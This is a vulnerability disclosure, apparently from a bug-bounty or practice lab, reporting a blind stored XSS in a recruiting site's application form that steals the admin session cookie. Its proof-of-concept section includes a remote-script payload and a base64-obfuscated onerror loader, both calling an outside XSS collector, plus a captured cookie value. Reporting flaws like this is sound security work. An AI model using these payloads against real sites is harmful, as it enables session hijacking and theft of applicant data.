## Title
Blind XSS in Job Application Form Fields - HireFlow

## Description
**Affected URL:** https://hireflow.pwnedbox.site/apply.php?job=1 (triggers on https://hireflow.pwnedbox.site/admin/index.php)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the job application submission form on `hireflow.pwnedbox.site`. Input submitted in the **First name** and **Last name** fields (as well as **Current location** and **Cover letter**) is stored without HTML encoding and renders directly in the DOM when an administrator views the recruiting pipeline dashboard in the backend (`/admin/index.php`). Because the script executes inside an authenticated admin session and `PHPSESSID` lacks the `HttpOnly` flag, an attacker can exfiltrate the administrator's session cookie and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://hireflow.pwnedbox.site/apply.php?job=1`, fill in the required fields with a Blind XSS payload in **First name**, **Last name**, **Current location**, and **Cover letter**, attach a valid resume file, and click **Submit application**.
2. Log in to the admin panel (`https://hireflow.pwnedbox.site/admin/index.php`).
3. Observe the payload execute immediately upon loading the dashboard under **Recent applications**, sending an out-of-band callback with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://hireflow.pwnedbox.site/apply.php?job=1` (`First name`, `Last name`, `Current location`, and `Cover letter` fields)

**Trigger Endpoint:** `https://hireflow.pwnedbox.site/admin/index.php`

**Payload:**
```html
"><script src=[https://xss.report/c/havemercy](https://xss.report/c/havemercy)></script>
```
*(Alternative payload submitted in Cover letter: `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>`)*

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://hireflow.pwnedbox.site/admin/index.php`
- **Referrer:** `https://hireflow.pwnedbox.site/admin/login.php`
- **Exfiltrated Session Cookie:** `PHPSESSID=3361f93d80ce43d37c2941a190808037`

**Visual Evidence:**
- Job application form on `hireflow.pwnedbox.site/apply.php?job=1` with the Blind XSS payloads entered in **First name**, **Last name**, **Current location**, and **Cover letter**.
  <img width="1505" height="1035" alt="image" src="https://github.com/user-attachments/assets/cf8e9f9a-d88b-44b7-85df-fe09f609d784" /><br><br>

- Admin recruiting dashboard (`/admin/index.php`) rendering the injected payloads directly in the **CANDIDATE** column (`""> ""`), alongside Browser Storage showing `PHPSESSID` with `HttpOnly` set to `false`.
  <img width="1901" height="897" alt="image" src="https://github.com/user-attachments/assets/eb5a809e-0300-4d84-8850-e804ae72fb69" /><br><br>

- Blind XSS collector report confirming execution on `/admin/index.php` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1600" height="1077" alt="image" src="https://github.com/user-attachments/assets/2758ac6d-d14b-481c-817d-c89217b6168a" /><br>


## Impact
Because the payload executes automatically as soon as an administrator opens the admin dashboard without needing to click into an individual candidate profile:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, download, or modify all submitted candidate applications, resumes, contact details, and interview records.
- **Persistent Compromise:** Attackers can use the hijacked admin session to manipulate hiring pipeline statuses, alter job postings, or make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied job application fields (`First name`, `Last name`, `Current location`, and `Cover letter`) before rendering them in `/admin/index.php` and candidate detail pages.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on `/admin/` pages (e.g., `default-src 'self'; script-src 'self';`) to block unauthorized external script sources and inline event handlers.
